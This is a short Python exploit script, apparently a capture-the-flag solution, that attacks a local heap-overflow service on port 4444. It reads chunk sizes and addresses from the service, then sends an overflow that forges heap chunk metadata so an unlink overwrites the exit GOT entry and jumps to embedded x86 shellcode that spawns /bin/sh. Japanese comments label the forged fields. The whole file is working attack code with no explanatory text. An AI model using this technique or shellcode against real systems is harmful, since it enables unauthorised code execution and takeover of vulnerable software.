# -*- coding: utf-8 -*-
from m1z0r3 import *

def malloc_align(n):
  if n % 8 != 0:
    n += (8-n%8)
  return n

ip = "localhost"
port = 4444

s,f = sock(ip,port)
shellcode = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x5f\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

read_until(f,"is at ")
exit_addr = 0x804c004
read_until(f)
size = []
addr = []
for _ in range(20): 
  tmp = read_until(f)[:-1]
  size.append(int(tmp.split("size=")[1][:-1]))
  addr.append(int(tmp[tmp.find("loc=")+4:tmp.find("loc=")+11],16))

assert size[10] == 260
read_until(f,"Write to object [size=260]:\n")
# chunk 1[10]
buf = "A" * 260
# chunk 2[11]
buf += p32((malloc_align(size[11])+8)|1) # size
buf += p32(exit_addr-8) # fd 書き換えたいメモリ-8
buf += p32(addr[12])    # bk 書き込みたい値
buf += "A" * (malloc_align(size[11])-8) # pad
# chunk 3[12]
buf += p32(malloc_align(size[11])+8) # prev_size
buf += p32(malloc_align(size[12])+8) # size
buf += shellcode
buf += "\n"

f.write(buf)
shell(s)
